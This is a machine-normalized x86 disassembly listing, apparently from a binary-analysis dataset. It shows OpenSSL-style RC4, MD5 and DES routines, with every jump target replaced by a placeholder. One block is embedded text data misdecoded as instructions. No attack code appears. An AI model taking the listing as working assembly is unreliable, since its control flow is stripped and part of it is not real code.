sub_42f200
push ebp
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
mov esi [ esp + 0x1c ]
mov ebp [ esp + 0x20 ]
xor eax eax
xor ebx ebx
cmp edx 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov al [ edi ]
mov bl [ edi + 0x4 ]
add edi 0x8
lea ecx [ esi + edx ]
sub ebp esi
mov [ esp + 0x18 ] ecx
inc al
cmp [ edi + 0x100 ] 0xffffffff
je r-xdata
movzx ecx [ edi + eax ]
mov ecx [ edi + eax * 4 ]
and edx 0xfffffffc
je r-xdata
add bl cl
movzx edx [ edi + ebx ]
mov [ edi + ebx ] cl
mov [ edi + eax ] dl
add dl cl
movzx edx [ edi + edx ]
add al 0x1
xor dl [ esi ]
lea esi [ esi + 0x1 ]
movzx ecx [ edi + eax ]
cmp esi [ esp + 0x18 ]
mov [ ebp + esi - 0x1 ] dl
jb r-xdata
dec al
mov [ edi - 0x4 ] bl
mov [ edi - 0x8 ] al
add bl cl
mov edx [ edi + ebx * 4 ]
mov [ edi + ebx * 4 ] ecx
mov [ edi + eax * 4 ] edx
add edx ecx
inc al
and edx 0xff
mov edx [ edi + edx * 4 ]
xor dl [ esi ]
lea esi [ esi + 0x1 ]
mov ecx [ edi + eax * 4 ]
cmp esi [ esp + 0x18 ]
mov [ ebp + esi - 0x1 ] dl
jb r-xdata
lea edx [ esi + edx - 0x4 ]
mov [ esp + 0x1c ] edx
mov [ esp + 0x20 ] ebp
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
jmp r-xdata
add bl cl
mov edx [ edi + ebx * 4 ]
mov [ edi + ebx * 4 ] ecx
mov [ edi + eax * 4 ] edx
add edx ecx
inc al
and edx 0xff
mov ecx [ edi + eax * 4 ]
mov ebp [ edi + edx * 4 ]
add bl cl
mov edx [ edi + ebx * 4 ]
mov [ edi + ebx * 4 ] ecx
mov [ edi + eax * 4 ] edx
add edx ecx
inc al
and edx 0xff
ror ebp 0x8
mov ecx [ edi + eax * 4 ]
or ebp [ edi + edx * 4 ]
add bl cl
mov edx [ edi + ebx * 4 ]
mov [ edi + ebx * 4 ] ecx
mov [ edi + eax * 4 ] edx
add edx ecx
inc al
and edx 0xff
ror ebp 0x8
mov ecx [ edi + eax * 4 ]
or ebp [ edi + edx * 4 ]
add bl cl
mov edx [ edi + ebx * 4 ]
mov [ edi + ebx * 4 ] ecx
mov [ edi + eax * 4 ] edx
add edx ecx
inc al
and edx 0xff
ror ebp 0x8
mov ecx [ esp + 0x20 ]
or ebp [ edi + edx * 4 ]
ror ebp 0x8
xor ebp [ esi ]
cmp esi [ esp + 0x1c ]
mov [ ecx + esi ] ebp
lea esi [ esi + 0x4 ]
mov ecx [ edi + eax * 4 ]
jb r-xdata
cmp esi [ esp + 0x18 ]
je r-xdata
mov ebp [ esp + 0x20 ]
nop
nop
nop
nop
sub_42f390
push ebp
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
mov ebp [ esp + 0x18 ]
mov esi [ esp + 0x1c ]
lea edx [ rw-data ]
lea edi [ edi + 0x8 ]
lea esi [ esi + ebp ]
neg ebp
xor eax eax
mov [ edi - 0x4 ] ebp
bt [ edx ] 0x14
jb r-xdata
mov [ edi + eax ] al
add al 0x1
jae r-xdata
nop
nop
nop
xor ecx ecx
xor edx edx
xor ebx ebx
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov [ edi + eax * 4 ] eax
add al 0x1
jae r-xdata
xor ecx ecx
xor edx edx
nop
mov [ edi + edx ] al
mov [ edi + ecx ] bl
add cl 0x1
jae r-xdata
mov ebp [ edi - 0x4 ]
mov [ edi + edx * 4 ] eax
mov [ edi + ecx * 4 ] ebx
add cl 0x1
jae r-xdata
mov ebp [ edi - 0x4 ]
mov al [ edi + ecx ]
add dl [ esi + ebp ]
add dl al
add ebp 0x1
mov bl [ edi + edx ]
jne r-xdata
mov [ edi + 0x100 ] 0xffffffff
mov eax [ edi + ecx * 4 ]
add dl [ esi + ebp ]
add dl al
add ebp 0x1
mov ebx [ edi + edx * 4 ]
jne r-xdata
jmp r-xdata
xor eax eax
mov [ edi - 0x8 ] eax
mov [ edi - 0x4 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_42f499
push edx
inc ebx
xor al 0x20
outsw
jb r-xdata
insb
outsd
jb r-xdata
js r-xdata
mov dh 0x50
add eax 0x8908e2c1
add [ eax - 0x6f6f6f70 ] dl
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
sub al 0x20
inc ebx
push edx
pop ecx
push eax
push esp
dec edi
inc edi
inc ecx
dec ebp
push ebx
and [ edx + 0x79 ] ah
and [ ecx ] bh
jo r-xdata
loop r-xdata
jb r-xdata
shl edx 0x8
or edx eax
shl edx 0x10
or edx ecx
mov ecx [ esp + 0x18 ]
mov [ esp + 0x4 ] edx
mov edx [ esp + 0x14 ]
push ecx
push edx
lea eax [ esp + 0x8 ]
push eax
call sub_430ac0
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0xc ]
mov [ eax ] cl
mov edx ecx
shr edx 0x8
mov [ eax + 0x1 ] dl
mov edx ecx
shr edx 0x10
mov [ eax + 0x2 ] dl
shr ecx 0x18
mov [ eax + 0x3 ] cl
mov ecx [ esp + 0x10 ]
mov edx ecx
shr edx 0x8
mov [ eax + 0x4 ] cl
mov [ eax + 0x5 ] dl
mov edx ecx
shr edx 0x10
shr ecx 0x18
mov [ eax + 0x6 ] dl
mov [ eax + 0x7 ] cl
add esp 0x14
retn
inc eax
push es
movzx ecx [ eax + 0x4 ]
or ecx edx
movzx edx [ eax + 0x7 ]
movzx eax [ eax + 0x6 ]
or ecx edx
movzx edx [ eax + 0x5 ]
shl edx 0x8
mov [ esp ] ecx
sbb [ ebx ] cl
0xb60f
inc eax
outsd
jo r-xdata
movzx edx [ eax + 0x3 ]
shl edx 0x18
outsb
jae r-xdata
or al 0x24
sub_42f500
mov eax 0x8
call sub_43a7f0
mov eax [ esp + 0xc ]
movzx edx [ eax + 0x1 ]
movzx ecx [ eax ]
shl edx 0x8
or ecx edx
movzx edx [ eax + 0x2 ]
shl edx 0x10
or ecx edx
movzx edx [ eax + 0x3 ]
shl edx 0x18
or ecx edx
movzx edx [ eax + 0x5 ]
shl edx 0x8
mov [ esp ] ecx
movzx ecx [ eax + 0x4 ]
or ecx edx
movzx edx [ eax + 0x7 ]
movzx eax [ eax + 0x6 ]
shl edx 0x8
or edx eax
shl edx 0x10
or edx ecx
mov ecx [ esp + 0x18 ]
mov [ esp + 0x4 ] edx
mov edx [ esp + 0x14 ]
push ecx
push edx
lea eax [ esp + 0x8 ]
push eax
call sub_430ac0
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0xc ]
mov [ eax ] cl
mov edx ecx
shr edx 0x8
mov [ eax + 0x1 ] dl
mov edx ecx
shr edx 0x10
mov [ eax + 0x2 ] dl
shr ecx 0x18
mov [ eax + 0x3 ] cl
mov ecx [ esp + 0x10 ]
mov edx ecx
shr edx 0x8
mov [ eax + 0x4 ] cl
mov [ eax + 0x5 ] dl
mov edx ecx
shr edx 0x10
shr ecx 0x18
mov [ eax + 0x6 ] dl
mov [ eax + 0x7 ] cl
add esp 0x14
retn
sub_42f5c0
push esi
push edi
mov edi [ esp + 0xc ]
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
push ebp
shl ecx 0x6
push ebx
add ecx esi
sub ecx 0x40
mov eax [ edi ]
push ecx
mov ebx [ edi + 0x4 ]
mov ecx [ edi + 0x8 ]
mov edx [ edi + 0xc ]
mov edi ecx
mov ebp [ esi ]
xor edi edx
and edi ebx
lea eax [ eax + ebp - 0x28955b88 ]
xor edi edx
add eax edi
mov edi ebx
rol eax 0x7
mov ebp [ esi + 0x4 ]
add eax ebx
xor edi ecx
and edi eax
lea edx [ edx + ebp - 0x173848aa ]
xor edi ecx
add edx edi
mov edi eax
rol edx 0xc
mov ebp [ esi + 0x8 ]
add edx eax
xor edi ebx
and edi edx
lea ecx [ ecx + ebp + 0x242070db ]
xor edi ebx
add ecx edi
mov edi edx
rol ecx 0x11
mov ebp [ esi + 0xc ]
add ecx edx
xor edi eax
and edi ecx
lea ebx [ ebx + ebp - 0x3e423112 ]
xor edi eax
add ebx edi
mov edi ecx
rol ebx 0x16
mov ebp [ esi + 0x10 ]
add ebx ecx
xor edi edx
and edi ebx
lea eax [ eax + ebp - 0xa83f051 ]
xor edi edx
add eax edi
mov edi ebx
rol eax 0x7
mov ebp [ esi + 0x14 ]
add eax ebx
xor edi ecx
and edi eax
lea edx [ edx + ebp + 0x4787c62a ]
xor edi ecx
add edx edi
mov edi eax
rol edx 0xc
mov ebp [ esi + 0x18 ]
add edx eax
xor edi ebx
and edi edx
lea ecx [ ecx + ebp - 0x57cfb9ed ]
xor edi ebx
add ecx edi
mov edi edx
rol ecx 0x11
mov ebp [ esi + 0x1c ]
add ecx edx
xor edi eax
and edi ecx
lea ebx [ ebx + ebp - 0x2b96aff ]
xor edi eax
add ebx edi
mov edi ecx
rol ebx 0x16
mov ebp [ esi + 0x20 ]
add ebx ecx
xor edi edx
and edi ebx
lea eax [ eax + ebp + 0x698098d8 ]
xor edi edx
add eax edi
mov edi ebx
rol eax 0x7
mov ebp [ esi + 0x24 ]
add eax ebx
xor edi ecx
and edi eax
lea edx [ edx + ebp - 0x74bb0851 ]
xor edi ecx
add edx edi
mov edi eax
rol edx 0xc
mov ebp [ esi + 0x28 ]
add edx eax
xor edi ebx
and edi edx
lea ecx [ ecx + ebp - 0xa44f ]
xor edi ebx
add ecx edi
mov edi edx
rol ecx 0x11
mov ebp [ esi + 0x2c ]
add ecx edx
xor edi eax
and edi ecx
lea ebx [ ebx + ebp - 0x76a32842 ]
xor edi eax
add ebx edi
mov edi ecx
rol ebx 0x16
mov ebp [ esi + 0x30 ]
add ebx ecx
xor edi edx
and edi ebx
lea eax [ eax + ebp + 0x6b901122 ]
xor edi edx
add eax edi
mov edi ebx
rol eax 0x7
mov ebp [ esi + 0x34 ]
add eax ebx
xor edi ecx
and edi eax
lea edx [ edx + ebp - 0x2678e6d ]
xor edi ecx
add edx edi
mov edi eax
rol edx 0xc
mov ebp [ esi + 0x38 ]
add edx eax
xor edi ebx
and edi edx
lea ecx [ ecx + ebp - 0x5986bc72 ]
xor edi ebx
add ecx edi
mov edi edx
rol ecx 0x11
mov ebp [ esi + 0x3c ]
add ecx edx
xor edi eax
and edi ecx
lea ebx [ ebx + ebp + 0x49b40821 ]
xor edi eax
add ebx edi
mov edi ecx
rol ebx 0x16
mov ebp [ esi + 0x4 ]
add ebx ecx
lea eax [ eax + ebp - 0x9e1da9e ]
xor edi ebx
and edi edx
mov ebp [ esi + 0x18 ]
xor edi ecx
add eax edi
mov edi ebx
rol eax 0x5
add eax ebx
lea edx [ edx + ebp - 0x3fbf4cc0 ]
xor edi eax
and edi ecx
mov ebp [ esi + 0x2c ]
xor edi ebx
add edx edi
mov edi eax
rol edx 0x9
add edx eax
lea ecx [ ecx + ebp + 0x265e5a51 ]
xor edi edx
and edi ebx
mov ebp [ esi ]
xor edi eax
add ecx edi
mov edi edx
rol ecx 0xe
add ecx edx
lea ebx [ ebx + ebp - 0x16493856 ]
xor edi ecx
and edi eax
mov ebp [ esi + 0x14 ]
xor edi edx
add ebx edi
mov edi ecx
rol ebx 0x14
add ebx ecx
lea eax [ eax + ebp - 0x29d0efa3 ]
xor edi ebx
and edi edx
mov ebp [ esi + 0x28 ]
xor edi ecx
add eax edi
mov edi ebx
rol eax 0x5
add eax ebx
lea edx [ edx + ebp + 0x2441453 ]
xor edi eax
and edi ecx
mov ebp [ esi + 0x3c ]
xor edi ebx
add edx edi
mov edi eax
rol edx 0x9
add edx eax
lea ecx [ ecx + ebp - 0x275e197f ]
xor edi edx
and edi ebx
mov ebp [ esi + 0x10 ]
xor edi eax
add ecx edi
mov edi edx
rol ecx 0xe
add ecx edx
lea ebx [ ebx + ebp - 0x182c0438 ]
xor edi ecx
and edi eax
mov ebp [ esi + 0x24 ]
xor edi edx
add ebx edi
mov edi ecx
rol ebx 0x14
add ebx ecx
lea eax [ eax + ebp + 0x21e1cde6 ]
xor edi ebx
and edi edx
mov ebp [ esi + 0x38 ]
xor edi ecx
add eax edi
mov edi ebx
rol eax 0x5
add eax ebx
lea edx [ edx + ebp - 0x3cc8f82a ]
xor edi eax
and edi ecx
mov ebp [ esi + 0xc ]
xor edi ebx
add edx edi
mov edi eax
rol edx 0x9
add edx eax
lea ecx [ ecx + ebp - 0xb2af279 ]
xor edi edx
and edi ebx
mov ebp [ esi + 0x20 ]
xor edi eax
add ecx edi
mov edi edx
rol ecx 0xe
add ecx edx
lea ebx [ ebx + ebp + 0x455a14ed ]
xor edi ecx
and edi eax
mov ebp [ esi + 0x34 ]
xor edi edx
add ebx edi
mov edi ecx
rol ebx 0x14
add ebx ecx
lea eax [ eax + ebp - 0x561c16fb ]
xor edi ebx
and edi edx
mov ebp [ esi + 0x8 ]
xor edi ecx
add eax edi
mov edi ebx
rol eax 0x5
add eax ebx
lea edx [ edx + ebp - 0x3105c08 ]
xor edi eax
and edi ecx
mov ebp [ esi + 0x1c ]
xor edi ebx
add edx edi
mov edi eax
rol edx 0x9
add edx eax
lea ecx [ ecx + ebp + 0x676f02d9 ]
xor edi edx
and edi ebx
mov ebp [ esi + 0x30 ]
xor edi eax
add ecx edi
mov edi edx
rol ecx 0xe
add ecx edx
lea ebx [ ebx + ebp - 0x72d5b376 ]
xor edi ecx
and edi eax
mov ebp [ esi + 0x14 ]
xor edi edx
add ebx edi
mov edi ecx
rol ebx 0x14
add ebx ecx
xor edi edx
xor edi ebx
lea eax [ eax + ebp - 0x5c6be ]
add eax edi
rol eax 0x4
mov ebp [ esi + 0x20 ]
mov edi ebx
lea edx [ edx + ebp - 0x788e097f ]
add eax ebx
xor edi ecx
xor edi eax
mov ebp [ esi + 0x2c ]
add edx edi
mov edi eax
rol edx 0xb
add edx eax
xor edi ebx
xor edi edx
lea ecx [ ecx + ebp + 0x6d9d6122 ]
add ecx edi
rol ecx 0x10
mov ebp [ esi + 0x38 ]
mov edi edx
lea ebx [ ebx + ebp - 0x21ac7f4 ]
add ecx edx
xor edi eax
xor edi ecx
mov ebp [ esi + 0x4 ]
add ebx edi
mov edi ecx
rol ebx 0x17
add ebx ecx
xor edi edx
xor edi ebx
lea eax [ eax + ebp - 0x5b4115bc ]
add eax edi
rol eax 0x4
mov ebp [ esi + 0x10 ]
mov edi ebx
lea edx [ edx + ebp + 0x4bdecfa9 ]
add eax ebx
xor edi ecx
xor edi eax
mov ebp [ esi + 0x1c ]
add edx edi
mov edi eax
rol edx 0xb
add edx eax
xor edi ebx
xor edi edx
lea ecx [ ecx + ebp - 0x944b4a0 ]
add ecx edi
rol ecx 0x10
mov ebp [ esi + 0x28 ]
mov edi edx
lea ebx [ ebx + ebp - 0x41404390 ]
add ecx edx
xor edi eax
xor edi ecx
mov ebp [ esi + 0x34 ]
add ebx edi
mov edi ecx
rol ebx 0x17
add ebx ecx
xor edi edx
xor edi ebx
lea eax [ eax + ebp + 0x289b7ec6 ]
add eax edi
rol eax 0x4
mov ebp [ esi ]
mov edi ebx
lea edx [ edx + ebp - 0x155ed806 ]
add eax ebx
xor edi ecx
xor edi eax
mov ebp [ esi + 0xc ]
add edx edi
mov edi eax
rol edx 0xb
add edx eax
xor edi ebx
xor edi edx
lea ecx [ ecx + ebp - 0x2b10cf7b ]
add ecx edi
rol ecx 0x10
mov ebp [ esi + 0x18 ]
mov edi edx
lea ebx [ ebx + ebp + 0x4881d05 ]
add ecx edx
xor edi eax
xor edi ecx
mov ebp [ esi + 0x24 ]
add ebx edi
mov edi ecx
rol ebx 0x17
add ebx ecx
xor edi edx
xor edi ebx
lea eax [ eax + ebp - 0x262b2fc7 ]
add eax edi
rol eax 0x4
mov ebp [ esi + 0x30 ]
mov edi ebx
lea edx [ edx + ebp - 0x1924661b ]
add eax ebx
xor edi ecx
xor edi eax
mov ebp [ esi + 0x3c ]
add edx edi
mov edi eax
rol edx 0xb
add edx eax
xor edi ebx
xor edi edx
lea ecx [ ecx + ebp + 0x1fa27cf8 ]
add ecx edi
rol ecx 0x10
mov ebp [ esi + 0x8 ]
mov edi edx
lea ebx [ ebx + ebp - 0x3b53a99b ]
add ecx edx
xor edi eax
xor edi ecx
mov ebp [ esi ]
add ebx edi
mov edi 0xffffffff
rol ebx 0x17
add ebx ecx
xor edi edx
or edi ebx
lea eax [ eax + ebp - 0xbd6ddbc ]
xor edi ecx
mov ebp [ esi + 0x1c ]
add eax edi
mov edi 0xffffffff
rol eax 0x6
xor edi ecx
add eax ebx
or edi eax
lea edx [ edx + ebp + 0x432aff97 ]
xor edi ebx
mov ebp [ esi + 0x38 ]
add edx edi
mov edi 0xffffffff
rol edx 0xa
xor edi ebx
add edx eax
or edi edx
lea ecx [ ecx + ebp - 0x546bdc59 ]
xor edi eax
mov ebp [ esi + 0x14 ]
add ecx edi
mov edi 0xffffffff
rol ecx 0xf
xor edi eax
add ecx edx
or edi ecx
lea ebx [ ebx + ebp - 0x36c5fc7 ]
xor edi edx
mov ebp [ esi + 0x30 ]
add ebx edi
mov edi 0xffffffff
rol ebx 0x15
xor edi edx
add ebx ecx
or edi ebx
lea eax [ eax + ebp + 0x655b59c3 ]
xor edi ecx
mov ebp [ esi + 0xc ]
add eax edi
mov edi 0xffffffff
rol eax 0x6
xor edi ecx
add eax ebx
or edi eax
lea edx [ edx + ebp - 0x70f3336e ]
xor edi ebx
mov ebp [ esi + 0x28 ]
add edx edi
mov edi 0xffffffff
rol edx 0xa
xor edi ebx
add edx eax
or edi edx
lea ecx [ ecx + ebp - 0x100b83 ]
xor edi eax
mov ebp [ esi + 0x4 ]
add ecx edi
mov edi 0xffffffff
rol ecx 0xf
xor edi eax
add ecx edx
or edi ecx
lea ebx [ ebx + ebp - 0x7a7ba22f ]
xor edi edx
mov ebp [ esi + 0x20 ]
add ebx edi
mov edi 0xffffffff
rol ebx 0x15
xor edi edx
add ebx ecx
or edi ebx
lea eax [ eax + ebp + 0x6fa87e4f ]
xor edi ecx
mov ebp [ esi + 0x3c ]
add eax edi
mov edi 0xffffffff
rol eax 0x6
xor edi ecx
add eax ebx
or edi eax
lea edx [ edx + ebp - 0x1d31920 ]
xor edi ebx
mov ebp [ esi + 0x18 ]
add edx edi
mov edi 0xffffffff
rol edx 0xa
xor edi ebx
add edx eax
or edi edx
lea ecx [ ecx + ebp - 0x5cfebcec ]
xor edi eax
mov ebp [ esi + 0x34 ]
add ecx edi
mov edi 0xffffffff
rol ecx 0xf
xor edi eax
add ecx edx
or edi ecx
lea ebx [ ebx + ebp + 0x4e0811a1 ]
xor edi edx
mov ebp [ esi + 0x10 ]
add ebx edi
mov edi 0xffffffff
rol ebx 0x15
xor edi edx
add ebx ecx
or edi ebx
lea eax [ eax + ebp - 0x8ac817e ]
xor edi ecx
mov ebp [ esi + 0x2c ]
add eax edi
mov edi 0xffffffff
rol eax 0x6
xor edi ecx
add eax ebx
or edi eax
lea edx [ edx + ebp - 0x42c50dcb ]
xor edi ebx
mov ebp [ esi + 0x8 ]
add edx edi
mov edi 0xffffffff
rol edx 0xa
xor edi ebx
add edx eax
or edi edx
lea ecx [ ecx + ebp + 0x2ad7d2bb ]
xor edi eax
mov ebp [ esi + 0x24 ]
add ecx edi
mov edi 0xffffffff
rol ecx 0xf
xor edi eax
add ecx edx
or edi ecx
lea ebx [ ebx + ebp - 0x14792c6f ]
xor edi edx
mov ebp [ esp + 0x18 ]
add ebx edi
add esi 0x40
rol ebx 0x15
mov edi [ ebp ]
add ebx ecx
add eax edi
mov edi [ ebp + 0x4 ]
add ebx edi
mov edi [ ebp + 0x8 ]
add ecx edi
mov edi [ ebp + 0xc ]
add edx edi
mov [ ebp ] eax
mov [ ebp + 0x4 ] ebx
mov edi [ esp ]
mov [ ebp + 0x8 ] ecx
mov [ ebp + 0xc ] edx
cmp edi esi
jae r-xdata
pop eax
pop ebx
pop ebp
pop edi
pop esi
retn
sub_42fc80
push ecx
mov eax [ ecx ]
xor ebx ebx
mov edx [ ecx + 0x4 ]
xor eax esi
xor ecx ecx
xor edx esi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor edi [ ebp + ebx ]
mov bl dl
xor edi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor edi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor edi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor edi [ ebp + ebx + 0x600 ]
xor edi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor edi [ ebp + eax + 0x400 ]
xor edi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov edx [ ecx + 0xc ]
xor eax edi
xor ecx ecx
xor edx edi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor esi [ ebp + ebx ]
mov bl dl
xor esi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor esi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor esi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor esi [ ebp + ebx + 0x600 ]
xor esi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor esi [ ebp + eax + 0x400 ]
xor esi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x10 ]
xor ebx ebx
mov edx [ ecx + 0x14 ]
xor eax esi
xor ecx ecx
xor edx esi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor edi [ ebp + ebx ]
mov bl dl
xor edi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor edi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor edi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor edi [ ebp + ebx + 0x600 ]
xor edi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor edi [ ebp + eax + 0x400 ]
xor edi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x18 ]
xor ebx ebx
mov edx [ ecx + 0x1c ]
xor eax edi
xor ecx ecx
xor edx edi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor esi [ ebp + ebx ]
mov bl dl
xor esi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor esi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor esi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor esi [ ebp + ebx + 0x600 ]
xor esi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor esi [ ebp + eax + 0x400 ]
xor esi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x20 ]
xor ebx ebx
mov edx [ ecx + 0x24 ]
xor eax esi
xor ecx ecx
xor edx esi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor edi [ ebp + ebx ]
mov bl dl
xor edi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor edi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor edi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor edi [ ebp + ebx + 0x600 ]
xor edi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor edi [ ebp + eax + 0x400 ]
xor edi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x28 ]
xor ebx ebx
mov edx [ ecx + 0x2c ]
xor eax edi
xor ecx ecx
xor edx edi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor esi [ ebp + ebx ]
mov bl dl
xor esi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor esi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor esi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor esi [ ebp + ebx + 0x600 ]
xor esi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor esi [ ebp + eax + 0x400 ]
xor esi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x30 ]
xor ebx ebx
mov edx [ ecx + 0x34 ]
xor eax esi
xor ecx ecx
xor edx esi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor edi [ ebp + ebx ]
mov bl dl
xor edi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor edi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor edi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor edi [ ebp + ebx + 0x600 ]
xor edi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor edi [ ebp + eax + 0x400 ]
xor edi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x38 ]
xor ebx ebx
mov edx [ ecx + 0x3c ]
xor eax edi
xor ecx ecx
xor edx edi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor esi [ ebp + ebx ]
mov bl dl
xor esi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor esi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor esi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor esi [ ebp + ebx + 0x600 ]
xor esi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor esi [ ebp + eax + 0x400 ]
xor esi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x40 ]
xor ebx ebx
mov edx [ ecx + 0x44 ]
xor eax esi
xor ecx ecx
xor edx esi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor edi [ ebp + ebx ]
mov bl dl
xor edi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor edi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor edi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor edi [ ebp + ebx + 0x600 ]
xor edi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor edi [ ebp + eax + 0x400 ]
xor edi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x48 ]
xor ebx ebx
mov edx [ ecx + 0x4c ]
xor eax edi
xor ecx ecx
xor edx edi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor esi [ ebp + ebx ]
mov bl dl
xor esi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor esi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor esi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor esi [ ebp + ebx + 0x600 ]
xor esi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor esi [ ebp + eax + 0x400 ]
xor esi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x50 ]
xor ebx ebx
mov edx [ ecx + 0x54 ]
xor eax esi
xor ecx ecx
xor edx esi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor edi [ ebp + ebx ]
mov bl dl
xor edi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor edi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor edi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor edi [ ebp + ebx + 0x600 ]
xor edi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor edi [ ebp + eax + 0x400 ]
xor edi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x58 ]
xor ebx ebx
mov edx [ ecx + 0x5c ]
xor eax edi
xor ecx ecx
xor edx edi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor esi [ ebp + ebx ]
mov bl dl
xor esi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor esi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor esi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor esi [ ebp + ebx + 0x600 ]
xor esi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor esi [ ebp + eax + 0x400 ]
xor esi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x60 ]
xor ebx ebx
mov edx [ ecx + 0x64 ]
xor eax esi
xor ecx ecx
xor edx esi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor edi [ ebp + ebx ]
mov bl dl
xor edi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor edi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor edi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor edi [ ebp + ebx + 0x600 ]
xor edi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor edi [ ebp + eax + 0x400 ]
xor edi [ ebp + edx + 0x500 ]
